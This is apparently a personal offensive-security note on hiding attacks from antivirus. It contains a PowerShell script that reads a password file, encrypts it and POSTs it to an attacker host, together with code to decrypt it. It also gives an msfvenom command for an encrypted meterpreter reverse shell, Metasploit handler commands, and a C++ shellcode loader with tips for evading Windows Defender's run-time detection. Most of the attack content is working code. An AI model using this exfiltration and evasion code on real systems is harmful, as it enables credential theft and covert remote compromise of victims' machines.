# Encrypting PowerShell Attacks
Also see [[PowerShell Evasion]]

The following basic example of data exfiltration relies on PowerShell. The provided proof of concept code reads contents of a file from the local system, encrypts it with a variation of Advanced Encryption Standard (AES) and sends it to the attacker’s server via HTTP over the port 80. 

This approach bypasses the anti-virus' static scanning capabilities and forces the client to rely on cloud scanning. Your code can easily be caught by the AV once decrypted.

```PowerShell
# Encrypt(sender/victim/client)
$file = Get-Content C:\Users\RayC\Desktop\facebook_password.txt
$key = (New-Object System.Text.ASCIIEncoding).GetBytes("54b8617eca0e54c7d3c8e6732c6b687a")
$securestring = new-object System.Security.SecureString
foreach ($char in $file.toCharArray()) {
      $secureString.AppendChar($char)
}
$encryptedData = ConvertFrom-SecureString -SecureString $secureString -Key $key

Invoke-WebRequest -Uri http://www.attacker.host/exfil -Method POST -Body $encryptedData
```

```PowerShell
# Decrypt(receiver/hacker/host):
$key = (New-Object System.Text.ASCIIEncoding).GetBytes("54b8617eca0e54c7d3c8e6732c6b687a")
$encrypted = "76492d1116743f0423413b16050a5345MgB8AEIANQBHADAAUgA0AEgAbABOAE8AcwA4AFMAWAB5AG4AKwBEAHQAdgBrAGcAPQA9AHwAMgBiAGIANQBhADgANgA0AGEAZgBhAGEANwA2ADMAMwA4ADAANABjADUAYQA5ADAAMAA1AGIAMAA4ADgANwAyADkAYgA0ADEAMgBjADcAYQA3ADcAYQAyADcANQAyADUANQA4ADgANAA4AGEAOQA4AGUAMwA1ADkANwA5AGQAYQA4ADcAMABjADIAOAA3ADIANQA5ADMAZQBhAGEAOQBiADgAYQA0ADMAOAA3ADYAZQAwADYAZQBlADcAMQBlADQAZQA0ADkAMgBmADgAYQA5ADQANgA2ADcAMwBhADQANAA3AGYANABiAGQAYgAwADUAOABhADAANABjADkAYQBjAGQAZQBkAGMANQA2ADgAZAA5ADYAMAA4ADgANABhADUANwBiAGIAMABhAGUANAAyADcAYQAzADEANABkADMAYgA1AGUAYgAyADkAOQBiADcAYgA3ADIAMwBkADcANQA2AGMANABlADMAZQA5AGMANwA5ADMAMwA1ADEAMABmAGEAMQA0ADIAMgAxADcAZQA0AGUAZgA2AGQANgBlADkAMgBmADkAZgBiADkAOQBjADIAYQAxAGIAOAAyADkAOABmAA=="
echo $encrypted | ConvertTo-SecureString -key $key | ForEach-Object {[Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR($_))}
```

From here, we'll move to creating payloads with MSFvenom(Metasploit Framework).
## Shellcode Encryption
The following two H2 sections are largely pulled from [source 1](https://www.rapid7.com/blog/post/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/) with semantic differences.


If you are familiar with the [Metasploit Framework](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers), you would know that there is a module type called encoders. The purpose of an encoder is really to get around bad characters in exploits. For example, if you are exploiting a buffer overflow, chances are your long string (including the payload) cannot have a null character in it. We can use an encoder to change that null byte, and then change it back at run-time.

I’m pretty sure at one point of your life, you’ve tried to use an encoder to bypass AV. Although this might work sometimes, encoders aren’t meant for AV evasion at all. **You should use encryption.**

Encryption will defeat antivirus’ static scanning effectively, because the AV engine can’t crack it immediately. 
### Msfconsole and Encryption
Currently, there are a few encryption/encoding types msfconsole supports to protect your shellcode: AES256-CBC, RC4, XOR, and Base64.

To generate an encrypted shellcode with the msfconsole, here is an example with Metasploit 6:
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 --encrypt rc4 --encrypt-key mykey -f c
```
And here's how to use the Multi Handler to catch the shell:
```bash
msf6 > use exploit/multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST 0.0.0.0
msf6 > set LPORT 4444
msf6 > set EnableStageEncoding true
msf6 > set StageEncoder x86/fnstenv_mov
msf6 > run
```

The above generates a windows/meterpreter/reverse_tcp that is encrypted with RC4. It is also generated in C format, so that you can build your own loader in C/C++.

Although antivirus isn’t good at scanning encrypted shellcode statically, run-time monitoring is still a strong line of defense. It is easy to get caught after you decrypt and execute it.
## Loader/Malware Separation
Run-time detection is very hard to bypass because no matter the strategy, the code must be executed. Antivirus logs each behavior once the code is executed, which becomes less of a problem if you can separate the loader from the actual payload in different process spaces.

In the blog, Wei takes note of the fact that removing the last line, the AV did not block the code's execution, where it did *with* the last line involved in execution:
```cpp
int (*func)();
func = (int (*)()) shellcode;

# remove the following line, and the code sidesteps ban hammer
# leave the following line to get caught by Windefender
(int)(*func)();
```

This seems to imply that it’s usually okay to have harmful code in memory as long as you don’t execute it. Run-time analysis probably relies a lot on what code is actually executed; it cares less about what the program could potentially do. This makes sense, of course. If it does, the performance penalty is too high.

So instead of using a function pointer, I did a LoadLibrary to solve the problem with the loader:
```cpp
int main(void) {
  HMODULE hMod = LoadLibrary("shellcode.dll");
  if (hMod == nullptr) {
    cout << "Failed to load shellcode.dll" << endl;
  }

  return 0;
}
```

That is the extent of useful information from that source.
# Resources
1. https://www.rapid7.com/blog/post/2018/05/03/hiding-metasploit-shellcode-to-evade-windows-defender/
2. https://redsiege.com/adventures-in-shellcode-obfuscation/


#powershell #evasion #antivirus #data-exfiltration #metasploit #windows 